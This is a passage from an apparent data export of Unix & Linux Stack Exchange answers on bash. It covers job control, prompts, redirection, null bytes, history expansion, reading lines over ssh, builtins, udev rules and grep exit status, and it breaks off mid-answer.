         User  Portability  Utilities  option. It shall cause the shell to
         notify the user asynchronously of background job completions. The
         following message is written to standard error:
</code></pre>
</blockquote>

<pre><code>             ""[%d]%c %s%s\n"", &lt;job-number&gt;, &lt;current&gt;, &lt;status&gt;, &lt;job-name&gt;

         where the fields shall be as follows:

         &lt;current&gt; The  character  '+' identifies the job that would be
                     used as a default for the fg or  bg  utilities;  this
                     job  can  also  be specified using the job_id ""%+"" or
                     ""%%"".  The character  '−'  identifies  the  job  that
                     would  become  the default if the current default job
                     were to exit; this job can also  be  specified  using
                     the  job_id  ""%−"".   For  other jobs, this field is a
                     &lt;space&gt;.  At most one job can be identified with  '+'
                     and  at  most one job can be identified with '−'.  If
                     there is any suspended  job,  then  the  current  job
                     shall  be  a suspended job. If there are at least two
                     suspended jobs, then the previous job also shall be a
</code></pre>

<blockquote>
<pre><code>   −m  This option shall be supported if the implementation supports the
         User Portability Utilities option. All jobs shall be run in their
         own  process groups. Immediately before the shell issues a prompt
         after completion of the background job, a message  reporting  the
         exit  status  of  the background job shall be written to standard
         error. If a foreground job stops, the shell shall write a message
         to  standard  error to that effect, formatted as described by the
         jobs utility. In addition, if a job  changes  status  other  than
         exiting  (for  example,  if  it  stops  for input or output or is
         stopped by a SIGSTOP signal), the shell  shall  write  a  similar
         message immediately prior to writing the next prompt. This option
         is enabled by default for interactive shells.
</code></pre>
</blockquote>

<p>A very fundamental feature of Unix-based systems is their method of handling process <code>signals</code>. I once read an <a href=""http://www.linusakesson.net/programming/tty/"" rel=""nofollow noreferrer"">enlightening article</a> on the subject that likens this process to Douglas Adams' description of the planet <em>NowWhat:</em> </p>

<blockquote>
  <p>""In The Hitchhiker's Guide to the Galaxy, Douglas Adams mentions an 
  extremely dull planet, inhabited by a bunch of depressed humans and a 
  certain breed of animals with sharp teeth which communicate with the 
  humans by biting them very hard in the thighs. This is strikingly 
  similar to UNIX, in which the kernel communicates with processes by 
  sending paralyzing or deadly signals to them. Processes may intercept 
  some of the signals, and try to adapt to the situation, but most of them 
  don't."" </p>
</blockquote>

<p>This is referring to <code>kill signals</code>.</p>

<pre><code>% kill -l 
&gt; HUP INT QUIT ILL TRAP ABRT BUS FPE KILL USR1 SEGV USR2 PIPE ALRM TERM STKFLT CHLD CONT STOP TSTP TTIN TTOU URG XCPU XFSZ VTALRM PROF WINCH POLL PWR SYS
</code></pre>

<p>At least for me, the above quote answered a lot of questions. For instance, I'd always considered it very strange and not at all intuitive that if I wanted to monitor a <code>dd</code> process I had to <code>kill</code> it. After reading that it made sense.</p>

<p>I would say most of them <em>don't try to adapt</em> for good reason - it can be a far greater annoyance than it would be a boon to have a bunch of processes spamming your terminal with whatever information their developers thought might have been important to you.</p>

<p>Depending on your terminal configuration <em>(which you can check with <code>stty -a</code>)</em>, <code>CTRL+Z</code> is likely set to forward a <code>SIGTSTP</code> to the current foreground process group leader, which is likely your shell, and which should also be configured by default to <code>trap</code> that signal and suspend your last command. Again, as the answers of @jillagre and @Kiwy together show, there's no stopping you from tailoring this functionality to your purpose as you prefer.</p>

<h3><code>SCREEN JOBS</code></h3>

<p>So to take advantage of these features it's expected that you first understand them and customize their handling to your own needs. For example, I've just found <a href=""https://github.com/fnichol/dotfiles/blob/master/home/.screenrc"" rel=""nofollow noreferrer"">this screenrc on Github</a> that includes <code>screen</code> key-bindings for <code>SIGTSTP</code>:</p>

<pre><code># hitting 'C-z C-z' will run Ctrl+Z (SIGTSTP, suspend as usual)
bind ^Z stuff ^Z

# hitting 'C-z z' will suspend the screen client
bind z suspend
</code></pre>

<p>That would make it a simple matter to suspend a process running as a child <code>screen</code> process or the <code>screen</code> child process itself as you wished. </p>

<p>And immediately afterward:</p>

<pre><code>% fg  
</code></pre>

<p>OR:</p>

<pre><code>% bg
</code></pre>

<p>Would foreground or background the process as you preferred. The <code>jobs</code> built-in can provide you a list of these at any time. Adding the <code>-l</code> operand will include pid details.</p>
"
"Refer to a file under the same directory of a script found in $PATH","17717","<bash><path>","38","<p>These should work the same, as long as there are no symlinks (in the path  expansion or the script itself):</p>

<ul>
<li><p><code>MYDIR=""$(dirname ""$(realpath ""$0"")"")""</code></p></li>
<li><p><code>MYDIR=""$(dirname ""$(which ""$0"")"")""</code></p></li>
<li><p>A two step version of any of the above:</p>

<p><code>MYSELF=""$(realpath ""$0"")""</code></p>

<p><code>MYDIR=""${MYSELF%/*}""</code></p></li>
</ul>

<p>If there is a symlink on the way to your script, then <code>which</code> will provide an answer not including resolution of that link. If <code>realpath</code> is not installed by default on your system, <a href=""http://packages.debian.org/unstable/utils/realpath"" rel=""noreferrer"">you can find it here</a>.</p>

<p><strong>[EDIT]:</strong> As it seems that <code>realpath</code> has no advantage over <code>readlink -f</code> <a href=""https://unix.stackexchange.com/questions/17717/refer-to-a-file-under-the-same-directory-of-a-script-found-in-path/17802#17802"">suggested by Caleb</a>, it is probably better to use the latter. My timing tests indicate it is actually faster.</p>
"
"In which situations are PS2, PS3, PS4 used as the prompt?","193659","<bash><command-line><prompt>","38","<p>Here is what the bash documentation says:</p>

<pre><code>PS1    The  value  of  this parameter is expanded (see PROMPTING below)
       and used as the primary prompt string.   The  default  value  is
       ``\s-\v\$ ''.
PS2    The  value of this parameter is expanded as with PS1 and used as
       the secondary prompt string.  The default is ``&gt; ''.
PS3    The value of this parameter is used as the prompt for the select
       command (see SHELL GRAMMAR above).
PS4    The  value  of  this  parameter  is expanded as with PS1 and the
       value is printed before each command  bash  displays  during  an
       execution  trace.  The first character of PS4 is replicated mul‐
       tiple times, as necessary, to indicate multiple levels of  indi‐
       rection.  The default is ``+ ''.
</code></pre>

<p>So, <code>PS1</code> is your normal ""waiting for a command"" prompt, <code>PS2</code> is the
continuation prompt that you saw after typing an incomplete command,
<code>PS3</code> is shown when the <code>select</code> command is waiting for input, and
<code>PS4</code> is the debugging trace line prefix.</p>

<p>The documentation I quoted doesn't say so, but the default for
<code>PS3</code> in bash is <code>#?</code>:</p>

<pre><code>$ select x in foo bar baz; do echo $x; done
1) foo
2) bar
3) baz
#? 3
baz
#? 2
bar
#? ^C
</code></pre>
"
"Count number of lines of output from previous program","72819","<bash><shell><debian><command-line>","38","<p>You can use <code>tee</code> to split the output stream sending one copy to <code>wc</code> and the other copy to STDOUT like normal.</p>

<pre><code>program | tee &gt;(wc -l)
</code></pre>

<p>The <code>&gt;(cmd)</code> is bash syntax which means run <code>cmd</code> and replace the <code>&gt;(cmd)</code> bit with the path to (a named pipe connected to) that program's STDIN.</p>
"
"How to use a timer in bash?","53841","<bash>","37","<p>If you want the duration in seconds, at the top use</p>

<pre><code>start=$SECONDS
</code></pre>

<p>and at the end</p>

<pre><code>duration=$(( SECONDS - start ))
</code></pre>
"
"How do I use null bytes in Bash?","174016","<bash><null>","37","<p>Bash uses C-style strings internally, which are terminated by null bytes. This means that a Bash string (such as the value of a variable, or an argument to a command) can never actually contain a null byte. For example, this mini-script:</p>

<pre><code>foobar=$'foo\0bar'    # foobar='foo' + null byte + 'bar'
echo ""${#foobar}""     # print length of $foobar
</code></pre>

<p>actually prints <code>3</code>, because <code>$foobar</code> is actually just <code>'foo'</code>: the <code>bar</code> comes after the end of the string.</p>

<p>Similarly, <code>echo $'foo\0bar'</code> just prints <code>foo</code>, because <code>echo</code> doesn't know about the <code>\0bar</code> part.</p>

<p>As you can see, the <code>\0</code> sequence is actually very misleading in a <code>$'...'</code>-style string; it looks like a null byte inside the string, but it doesn't end up working that way. In your first example, your <code>read</code> command has <code>-d $'\0'</code>. This works, but only because <code>-d ''</code> also works! (That's not an explicitly documented feature of <code>read</code>, but I suppose it works for the same reason: <code>''</code> is the empty string, so its terminating null byte comes immediately. <code>-d <i>delim</i></code> is documented as using ""The first character of <i>delim</i>"", and I guess that even works if the ""first character"" is past the end of the string!)</p>

<p>But as you know from your <code>find</code> example, it <em>is</em> possible for a command to print out a null byte, and for that byte to be piped to another command that reads it as input. No part of that relies on storing a null byte <em>in a string inside Bash</em>. The only problem with your second example is that we can't use <code>$'\0'</code> in an argument to a command; <code>echo ""$file""$'\0'</code> could happily print the null byte at the end, if only it knew that you wanted it to.</p>

<p>So instead of using <code>echo</code>, you can use <code>printf</code>, which supports the same sorts of escape sequences as <code>$'...'</code>-style strings. That way, you can print a null byte without having to have a null byte inside a string. That would look like this:</p>

<pre><code>for file in * ; do printf '%s\0' ""$file"" ; done \
  | while IFS= read -r -d '' ; do echo ""$REPLY"" ; done
</code></pre>

<p>or simply this:</p>

<pre><code>printf '%s\0' * \
  | while IFS= read -r -d '' ; do echo ""$REPLY"" ; done
</code></pre>

<p>(Note: <code>echo</code> actually also has an <code>-e</code> flag that would let it process <code>\0</code> and print a null byte; but then it would also try to process any special sequences in your filename. So the <code>printf</code> approach is more robust.)</p>

<hr>

<p>Incidentally, there are some shells that <em>do</em> allow null bytes inside strings. Your example works fine in Zsh, for example (assuming default settings). However, regardless of your shell, Unix-like operating systems don't provide a way to include null bytes inside arguments to programs (since program arguments are passed as C-style strings), so there will always be some limitations. (Your example can work in Zsh only because <code>echo</code> is a shell builtin, so Zsh can invoke it without relying on the OS support for invoking other programs. If you used <code>command echo</code> instead of <code>echo</code>, so that it bypassed the builtin and used the standalone <code>echo</code> program on the <code>$PATH</code>, you'd see the same behavior in Zsh as in Bash.)</p>
"
"What does !$ mean?","88642","<bash><command-history>","37","<p>Basically, it's the last argument to the previous command.</p>

<blockquote>
  <p><code>!$</code> is the ""end"" of the previous command. Consider the following
  example: We start by looking for a word in a file:</p>

<pre><code>grep -i joe /some/long/directory/structure/user-lists/list-15
</code></pre>
  
  <p>if joe is in that userlist, we want to remove him from it. We can either fire up vi with that long directory tree as the argument, or as simply as <code>vi !$</code> Which
  bash expands to:</p>

<pre><code>vi /some/long/directory/structure/user-lists/list-15
</code></pre>
</blockquote>

<p><sup>(<a href=""https://web.archive.org/web/20130901181242/http://deadman.org/bash.php"" rel=""noreferrer"">source</a>; handy guide, by the way)</sup></p>

<hr>

<p>It's worth nothing the distinction between this <code>!$</code> token and the special shell variable <code>$_</code>.
Indeed, <em>both</em> expand to the last argument of the previous command. However, <code>!$</code> is expanded during <em>history expansion</em>, while <code>$_</code> is expanded during <em>parameter expansion</em>.
One important consequence of this is that, when you use <code>!$</code>, the <em>expanded</em> command is saved in your history.</p>

<p>For example, consider the keystrokes</p>

<ul>
<li><p><code>echo Foo</code> <kbd>Enter</kbd> <code>echo !$ Jar</code> <kbd>Enter</kbd> <kbd>Up</kbd> <kbd>Enter</kbd>; and</p></li>
<li><p><code>echo Foo</code> <kbd>Enter</kbd> <code>echo $_ Jar</code> <kbd>Enter</kbd> <kbd>Up</kbd> <kbd>Enter</kbd>.</p></li>
</ul>

<p>(The only characters changed are the <code>$!</code> and <code>$_</code> in the middle.)</p>

<p>In the former, when you press <kbd>Up</kbd>, the command line reads <code>echo Foo Jar</code>, so the last line written to stdout is <code>Foo Jar</code>.</p>

<p>In the latter, when you press <kbd>Up</kbd>, the command line reads <code>echo $_ bar</code>, but now <code>$_</code> has a different value than it did previously—indeed, <code>$_</code> is now <code>Jar</code>, so the last line written to stdout is <code>Jar Jar</code>.</p>

<p>Another consequence is that <code>_</code> can be used in other parameter expansions, for example, the sequence of commands</p>

<pre><code>printf '%s '    isomorphism
printf '%s\n'   ${_%morphism}sceles
</code></pre>

<p>prints <code>isomorphism isosceles</code>.
But there's no analogous ""<code>${!$%morphism}</code>"" expansion.</p>

<p>For more information about the phases of expansion in Bash, see the <code>EXPANSION</code> section of <code>man 1 bash</code> (this is called <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Shell-Expansions"" rel=""noreferrer"">Shell Expansions</a> in the online edition). The <code>HISTORY EXPANSION</code> section is separate.</p>
"
"search text on the terminal output","93783","<bash><gnu-screen><gnome-terminal>","37","<p><kbd>Ctrl+a</kbd> (default <code>screen</code> command prefix), <kbd>[</kbd> (enter <code>copy</code> mode) followed by <code>?SEARCH_TEXT</code> seems to work. Press <kbd>n</kbd> to go to the next occurrence. From there, you can copy words, lines, regions, etc to dump into files or paste later on (with <kbd>Ctrl+a</kbd>, <kbd>]</kbd>).</p>

<p><img src=""https://i.stack.imgur.com/o5tLz.png"" alt=""enter image description here""></p>
"
"How to restart the Python script automatically if it is killed or dies","107939","<bash><shell><cron><python>","37","<p>On Ubuntu (until 14.04, 16.04 and later use systemd) can use upstart to do so, better than a cron job. You put a config setup in <code>/etc/init</code> and make sure you specify <a href=""http://upstart.ubuntu.com/cookbook/#respawn"" rel=""noreferrer"">respawn</a></p>

<p>It could be a minimal file <code>/etc/init/testing.conf</code> (edit as <code>root</code>):</p>

<pre><code>chdir /your/base/directory
exec python testing.py
respawn
</code></pre>

<p>And you can test with <code>/your/base/directory/testing.py</code>:</p>

<pre><code>from __future__ import print_function

import time

with open('/var/tmp/testing.log', 'a') as fp:
    print(time.time(), 'done', file=fp)
    time.sleep(3)
</code></pre>

<p>and start with:</p>

<pre><code>sudo start testing
</code></pre>

<p>and follow what happens (in another window) with:</p>

<pre><code>tail -f /var/tmp/testing.log
</code></pre>

<p>and stop with:</p>

<pre><code>sudo stop testing
</code></pre>

<p>You can also add <code>[start on][2]</code> to have the command start on boot of the system.</p>
"
"Reading lines from a file with bash: for vs. while","24260","<bash><files><io-redirection>","37","<p>The <code>for</code> loop is fine here. But note that this is because the file contains machine names, which do not contain any whitespace characters or globbing characters. <code>for x in $(cat file); do …</code> does not work to iterate over the lines of <code>file</code> in general, because the shell first splits the output from the command <code>cat file</code> anywhere there is whitespace, and then treats each word as a glob pattern so <code>\[?*</code> are further expanded. You can make <code>for x in $(cat file)</code> safe if you work on it:</p>

<pre><code>set -f
IFS='
'
for x in $(cat file); do …
</code></pre>

<p>Related reading: <a href=""https://unix.stackexchange.com/questions/9496/looping-through-files-with-spaces-in-the-names"">Looping through files with spaces in the names?</a>; <a href=""https://unix.stackexchange.com/questions/9784/how-can-i-read-line-by-line-from-a-variable-in-bash"">How can I read line by line from a variable in bash?</a>; <a href=""https://unix.stackexchange.com/questions/18886/why-is-while-ifs-read-used-so-often-instead-of-ifs-while-read"">Why is <code>while IFS= read</code> used so often, instead of <code>IFS=; while read..</code>?</a> Note that when using <code>while read</code>, the safe syntax to read lines is <code>while IFS= read -r line; do …</code>.</p>

<p>Now let's turn to what goes wrong with your <code>while read</code> attempt. The redirection from the server list file applies to the whole loop. So when <code>ssh</code> runs, its standard input comes from that file. The ssh client can't know when the remote application might want to read from its standard input. So as soon as the ssh client notices some input, it sends that input to the remote side. The ssh server there is then ready to feed that input to the remote command, should it want it. In your case, the remote command never reads any input, so the data ends up discarded, but the client side doesn't know anything about that. Your attempt with <code>echo</code> worked because <code>echo</code> never reads any input, it leaves its standard input alone.</p>

<p>There are a few ways you can avoid this. You can tell ssh not to read from standard input, with the <code>-n</code> option.</p>

<pre><code>while read server; do
  ssh -n $server ""uname -a""
done &lt; /home/kenny/list_of_servers.txt
</code></pre>

<p>The <code>-n</code> option in fact tells <code>ssh</code> to redirect its input from <a href=""http://en.wikipedia.org/wiki//dev/null"" rel=""noreferrer""><code>/dev/null</code></a>. You can do that at the shell level, and it'll work for any command.</p>

<pre><code>while read server; do
  ssh $server ""uname -a"" &lt;/dev/null
done &lt; /home/kenny/list_of_servers.txt
</code></pre>

<p>A tempting method to avoid ssh's input coming from the file is to put the redirection on the <code>read</code> command: <code>while read server &lt;/home/kenny/list_of_servers.txt; do …</code>. This will not work, because it causes the file to be opened again each time the <code>read</code> command is executed (so it would read the first line of the file over and over). The redirection needs to be on the whole while loop so that the file is opened once for the duration of the loop.</p>

<p>The general solution is to provide the input to the loop on a <a href=""http://en.wikipedia.org/wiki/File_descriptor"" rel=""noreferrer"">file descriptor</a> other than standard input. The shell has constructs to ferry input and output from one descriptor number to another. Here, we open the file on file descriptor 3, and redirect the <code>read</code> command's standard input from file descriptor 3. The ssh client ignores open non-standard descriptors, so all is well.</p>

<pre><code>while read server &lt;&amp;3; do
  ssh $server ""uname -a""
done 3&lt;/home/kenny/list_of_servers.txt
</code></pre>

<p>In bash, the <code>read</code> command has a specific option to read from a different file descriptor, so you can write <code>read -u3 server</code>.</p>

<p>Related reading: <a href=""https://unix.stackexchange.com/questions/13724/file-descriptors-shell-scripting"">File descriptors &amp; shell scripting</a>; <a href=""https://unix.stackexchange.com/questions/18899/when-would-you-use-an-additional-file-descriptor"">When would you use an additional file descriptor?</a></p>
"
"Bash subshell creation with curly braces","127334","<bash><subshell>","37","<p>In a pipeline, all commands run concurrently (with their stdout/stdin connected by pipes) so in different processes.</p>

<p>In</p>

<pre><code>cmd1 | cmd2 | cmd3
</code></pre>

<p>All three commands run in different processes, so at least two of them have to run in a child process. Some shells run one of them in the current shell process (if builtin like <code>read</code> or if the pipeline is the last command of the script), but <code>bash</code> runs them all in their own separate process (except with the <code>lastpipe</code> option in recent <code>bash</code> versions and under some specific conditions).</p>

<p><code>{...}</code> groups commands. If that group is part of a pipeline, it has to run in a separate process just like a simple command.</p>

<p>In:</p>

<pre><code>{ a; b ""$?""; } | c
</code></pre>

<p>We need a shell to evaluate that <code>a; b ""$?""</code> is a separate process, so we need a subshell. The shell could optimise by not forking for <code>b</code> since it's the last command to be run in that group. Some shells do it, but apparently not <code>bash</code>.</p>
"
"where is `cd` located?","116955","<bash><shell><cd-command><fhs>","37","<h3>What cd am I using?</h3>

<p>If you're in Bash <code>cd</code> is a builtin. The type command even bears this out:</p>

<pre><code>$ type -a cd
cd is a shell builtin
cd is /usr/bin/cd
cd is /bin/cd
</code></pre>

<p>The system will use the first thing in this list, so the builtin will be the preferred option, and the only one that works (see the section below on <em>What is /bin/cd</em>). </p>

<h3>What's a builtin?</h3>

<p>I like to think of builtins as functions that Bash knows how to do itself. Basically anything that you use a lot has been moved into the Bash ""kernel"" so that it doesn't have to go executing a process for each time. </p>

<p>You can always explicitly tell Bash that you want a builtin by using the <code>builtin</code> command like so:</p>

<pre><code>$ builtin cd
</code></pre>

<p>See the help about <code>builtin</code>:</p>

<pre><code>$ help builtin
</code></pre>

<h3>Why isn't cd in hash?</h3>

<p>The hash is meant only to ""hash"" (aka. ""save"" in a key/value pair) the locations of files, not for builtins or keywords. The primary task for <code>hash</code> is in saving on having to go through the <code>$PATH</code> each time looking for frequently used executables.</p>

<h3>Keywords?</h3>

<p>These are typically the commands that are part of Bash's programming language features.</p>

<pre><code>$ type while
while is a shell keyword
$ type for
for is a shell keyword
$ type !
! is a shell keyword
</code></pre>

<p>Some things are implemented in multiple ways, such as <code>[</code>:</p>

<pre><code>$ type -a [
[ is a shell builtin
[ is /usr/bin/[
[ is /bin/[    
</code></pre>

<p>...and <code>cd</code> as you've discovered.</p>

<h3>What is /bin/cd?</h3>

<p>On my Fedora 19 system <code>/bin/cd</code> is actually a shell script:</p>

<pre><code>$ more /bin/cd
#!/bin/sh
builtin cd ""$@""
</code></pre>

<p>But it doesn't do what you think. See these other U&amp;L Q&amp;A's for more details:</p>

<ul>
<li><a href=""https://unix.stackexchange.com/questions/50058/what-is-the-point-of-the-cd-external-command"">What is the point of the `cd` external command?</a></li>
<li>""<a href=""https://unix.stackexchange.com/questions/50022/why-cant-i-redirect-a-path-name-output-from-one-command-to-cd"">Why can&#39;t I redirect a path name output from one command to &quot;cd&quot;?</a></li>
</ul>

<p>Bottom line:</p>

<p>POSIX's requires that it's there and in this implementation, it acts as a test, confirming that you're able to change directories to X, but then returning a return code confirming or denying that this is possible.</p>
"
"How to execute a shellscript when I plug-in a USB-device","65891","<linux><bash><ubuntu><udev>","37","<p>If you want to run the script on a specific device, you can use the vendor and product ids </p>

<ul>
<li><p>In  <code>/etc/udev/rules.d/test.rules</code>:</p>

<pre><code>ATTRS{idVendor}==""152d"", ATTRS{idProduct}==""2329"", RUN+=""/tmp/test.sh""
</code></pre></li>
<li><p>in <code>test.sh</code>:</p>

<pre><code>#! /bin/sh

env &gt;&gt;/tmp/test.log
file ""/sys${DEVPATH}"" &gt;&gt;/tmp/test.log

if [ ""${ACTION}"" = add -a -d ""/sys${DEVPATH}"" ]; then
echo ""add ${DEVPATH}"" &gt;&gt;/tmp/test.log
fi
</code></pre></li>
</ul>

<p>With <code>env</code>, you can see what environment is set from udev and with <code>file</code>, you will discover the file type.</p>

<p>The concrete attributes for your device can be discovered with <code>lsusb</code> </p>

<pre><code>lsusb
</code></pre>

<p>gives </p>

<blockquote>
  <p>...<br>
  Bus 001 Device 016: ID 152d:2329 JMicron Technology Corp. / JMicron USA Technology Corp. JM20329 SATA Bridge<br>
  ...</p>
</blockquote>
"
"How to ""grep"" for line length in a given range?","184519","<bash><sed><grep><perl>","37","<pre><code>grep -x '.\{3,10\}'
</code></pre>

<p>where</p>

<ul>
<li><code>-x</code> match pattern to whole line</li>
<li><code>.</code> any symbol</li>
<li><code>{3,10}</code> quantify from 3 to 10 times previous symbol (in the case any ones)</li>
</ul>
"
"Bash: repeat last N commands","33389","<bash>","37","<p><code>fc -N -1</code></p>

<p>Where the <code>-N</code> is the last N commands you want to repeat.</p>

<p>This will open an editor with the last N commands in it. You can edit the commands as desired and when you close the editor, they will all be run in sequence.</p>
"
"How to redirect stderr and stdout to different files and also display in terminal?","6430","<bash><logs><io-redirection>","37","<p>Use the <code>tee</code> command as follows:</p>

<pre><code>(cmd | tee stdout.log) 3&gt;&amp;1 1&gt;&amp;2 2&gt;&amp;3 | tee stderr.log
</code></pre>

<p><code>3&gt;&amp;1 1&gt;&amp;2 2&gt;&amp;3</code> is how you swap stderr and stdout, because tee can only accept stdout.</p>

<p>Take a look at <a href=""http://www.softpanorama.org/Tools/tee.shtml"">Unix tee command</a> for more advanced redirections using <code>tee</code>.</p>
"
"How can I close a terminal without killing its children (without running `screen` first)?","8469","<bash><terminal><process><kill><job-control>","37","<p>If <code>some-boring-process</code> is running in your current bash session:</p>

<ol>
<li>halt it with <code>ctrl-z</code> to give you the bash prompt</li>
<li>put it in the background with <code>bg</code></li>
<li>note the job number, or use the <code>jobs</code> command</li>
<li>detach the process from this bash session with <code>disown -h %1</code> (substitute the actual job number there).</li>
</ol>

<p>That doesn't do anything to redirect the output -- you have to think of that when you launch your boring process. [Edit] There seems to be a way to redirect it <a href=""https://gist.github.com/782263"" rel=""nofollow noreferrer"">https://gist.github.com/782263</a></p>

<p>But seriously, look into screen. I have shells on a remote server that have been running for months.</p>

<hr>

<p>Looks like this:</p>

<pre class=""lang-bsh prettyprint-override""><code>$ sleep 999999
^Z
[1]+  Stopped                 sleep 999999
$ bg
[1]+ sleep 999999 &amp;
$ disown -h %1
</code></pre>
"
"Avoiding ""BASH-isms"" in shell scripts","24146","<bash><shell><zsh><ash>","37","<p>There's <a href=""http://sourceforge.net/projects/checkbaskisms/"" rel=""nofollow noreferrer"">checkbashisms</a>. On Debian, it's shipped as part of the <a href=""http://packages.debian.org/squeeze/devscripts"" rel=""nofollow noreferrer"">package maintainer tools</a>.</p>

<p>Test your scripts under <a href=""http://gondor.apana.org.au/~herbert/dash/"" rel=""nofollow noreferrer"">dash</a> and <a href=""http://packages.debian.org/squeeze/posh"" rel=""nofollow noreferrer"">posh</a>. Both have a few non-POSIX constructs, but if your script works in both, it's likely to work in most places. (With the caveat that it's difficult to test typical shell scripts as they tend to have a lot of corner cases.)</p>

<p>If you intend for your scripts to be portable to embedded Linux platforms, test them with <a href=""http://www.busybox.net/"" rel=""nofollow noreferrer"">BusyBox</a>. Note that BusyBox can be more or less restricted, depending on how small an embedded system you want; it's quite normal to have scripts that rely on a feature that some BusyBox installations don't have.</p>

<p>Note that non-portability doesn't come from the shell alone, it also comes from external utilities. OpenBSD and Solaris tend to have utilities with POSIX features and not much more, so they're good for testing for portability.</p>

<p>You'll want to refer to the <a href=""http://pubs.opengroup.org/onlinepubs/009695399/"" rel=""nofollow noreferrer"">POSIX specification</a>, and other resources mentioned in <a href=""https://unix.stackexchange.com/questions/9997/resources-for-portable-shell-programming"">this thread</a> (especially the <a href=""http://www.gnu.org/s/hello/manual/autoconf/Portable-Shell.html"" rel=""nofollow noreferrer"">autoconf manual</a>); but that's documentation, it doesn't help if you use a feature accidentally.</p>
"
"Should we use UTF-8 characters like ⏰ in bash/shell script?","484423","<bash><shell><unicode>","36","<p>A useful guideline for this is the ""Portable Operating System Interface"" (POSIX), a family of standards that is implemented by most Unix-like systems. It is usually a good idea to limit shell scripts to features mandated by POSIX to make sure they will be usable across different shells and platforms.</p>

<p>According to the POSIX specification of <a href=""http://pubs.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html#tag_02_09_05"" rel=""noreferrer"">function definitions in the ""Shell Command Language""</a>:</p>

<blockquote>
  <p>The function is named fname; the application shall ensure that it is a name (see the Base Definitions volume of IEEE Std 1003.1-2001, <a href=""http://pubs.opengroup.org/onlinepubs/009695399/basedefs/xbd_chap03.html#tag_03_230"" rel=""noreferrer"">Section 3.230, Name</a>). An implementation may allow other characters in a function name as an extension.</p>
</blockquote>

<p>Following the link to the <a href=""http://pubs.opengroup.org/onlinepubs/009695399/basedefs/xbd_chap03.html#tag_03_230"" rel=""noreferrer"">definition of a ""name""</a>:</p>

<blockquote>
  <p>In the shell command language, a word consisting solely of underscores, digits, and alphabetics from the <a href=""http://pubs.opengroup.org/onlinepubs/009695399/basedefs/xbd_chap06.html#tag_06_01"" rel=""noreferrer"">portable character set</a>.</p>
</blockquote>

<p>That character set contains only characters between U0000 and U007E.<br>
Therefore characters like ""⏰"" (U23F0) are not valid in a POSIX-compliant identifier.</p>

<p><strong><em>Your</em> shell might accept them, but that doesn't guarantee that <em>others</em> will as well.</strong><br>
To be able to use your script across different platforms and software versions, you should avoid using non-compliant identifiers like this.</p>
"
"Trap, ERR, and echoing the error line","39623","<bash><shell-script><error-handling><trap>","36","<p>As pointed out in comments, your quoting is wrong. You need single quotes to prevent <code>$LINENO</code> from being expanded when the trap line is first parsed.</p>

<p>This works:</p>

<pre><code>#! /bin/bash

err_report() {
    echo ""Error on line $1""
}

trap 'err_report $LINENO' ERR

echo hello | grep foo  # This is line number 9
</code></pre>

<p>Running it:</p>

<pre><code> $ ./test.sh
 Error on line 9
</code></pre>
"
"Why is opening a file faster than reading variable content?","501828","<bash><shell-script><shell><zsh><variable>","36","<p>Here, it's not about <em>opening a file</em> versus <em>reading a variable's content</em> but more about forking an extra process or not.</p>

<p><code>grep -oP '^MemFree: *\K[0-9]+' /proc/meminfo</code> forks a process that executes <code>grep</code> that opens <code>/proc/meminfo</code> (a virtual file, in memory, no disk I/O involved) reads it and matches the regexp.</p>

<p>The most expensive part in that is forking the process and loading the grep utility and its library dependencies, doing the dynamic linking, open the locale database, dozens of files that are on disk (but likely cached in memory).</p>

<p>The part about reading <code>/proc/meminfo</code> is insignificant in comparison, the kernel needs little time to generate the information in there and <code>grep</code> needs little time to read it.</p>

<p>If you run <code>strace -c</code> on that, you'll see the one <code>open()</code> and one <code>read()</code> systems calls used to read <code>/proc/meminfo</code> is peanuts compared to everything else <code>grep</code> does to start (<code>strace -c</code> doesn't count the forking).</p>

<p>In:</p>

<pre><code>a=$(&lt;/proc/meminfo)
</code></pre>

<p>In most shells that support that <code>$(&lt;...)</code> ksh operator, the shell just opens the file and read its content (and strips the trailing newline characters). <code>bash</code> is different and much less efficient in that it forks a process to do that reading and passes the data to the parent via a pipe. But here, it's done once so it doesn't matter.</p>

<p>In:</p>

<pre><code>printf '%s\n' ""$a"" | grep '^MemFree'
</code></pre>

<p>The shell needs to spawn <strong>two</strong> processes, which are running concurrently but interact between each other via a pipe. That pipe creation, tearing down, and writing and reading from it has some little cost. The much greater cost is the spawning of an extra process. The scheduling of the processes has some impact as well.</p>

<p>You may find that using the zsh <code>&lt;&lt;&lt;</code> operator makes it slightly quicker:</p>

<pre><code>grep '^MemFree' &lt;&lt;&lt; ""$a""
</code></pre>

<p>In zsh and bash, that's done by writing the  content of <code>$a</code> in a temporary file, that is less expensive than spawning an extra process, but will probably not give you any gain compared to getting the data straight off <code>/proc/meminfo</code>. That's still less efficient than your approach that copies <code>/proc/meminfo</code> on disk, as the writing of the temp file is done at each iteration.</p>

<p><code>dash</code> doesn't support here-strings, but its heredocs are implemented with a pipe that doesn't involve spawning an extra process. In:</p>

<pre><code> grep '^MemFree' &lt;&lt; EOF
 $a
 EOF
</code></pre>

<p>The shell creates a pipe, forks a process. The child executes <code>grep</code> with its stdin as the reading end of the pipe, and the parent writes the content at the other end of the pipe.</p>

<p>But that pipe handling and process synchronisation is still likely to be more expensive than just getting the data straight off <code>/proc/meminfo</code>.</p>

<p>The content of <code>/proc/meminfo</code> is short and takes not much time to produce. If you want to save some CPU cycles, you want to remove the expensive parts: forking processes and running external commands.</p>

<p>Like:</p>

<pre><code>IFS= read -rd '' meminfo &lt; /proc/meminfo
memfree=${meminfo#*MemFree:}
memfree=${memfree%%$'\n'*}
memfree=${memfree#""${memfree%%[! ]*}""}
</code></pre>

<p>Avoid <code>bash</code> though whose pattern matching is very ineficient. With <code>zsh -o extendedglob</code>, you can shorten it to:</p>

<pre><code>memfree=${${""$(&lt;/proc/meminfo)""##*MemFree: #}%%$'\n'*}
</code></pre>

<p>Note that <code>^</code> is special in many shells (Bourne, fish, rc, es and zsh with the extendedglob option at least), I'd recommend quoting it. Also note that <code>echo</code> can't be used to output arbitrary data (hence my use of <code>printf</code> above).</p>
"
"How to use grep when file does not contain the string","223503","<bash><ubuntu><grep>","36","<p><code>grep</code> will return success if it finds at least one instance of the pattern and failure if it does not.  So you could either add an <code>else</code> clause if you want both ""does"" and ""does not"" prints, or you could just negate the <code>if</code> condition to only get failures.  An example of each:</p>

<pre><code>if grep -q ""$user2"" /etc/passwd; then
    echo ""User does exist!!""
else
    echo ""User does not exist!!""
fi

if ! grep -q ""$user2"" /etc/passwd; then
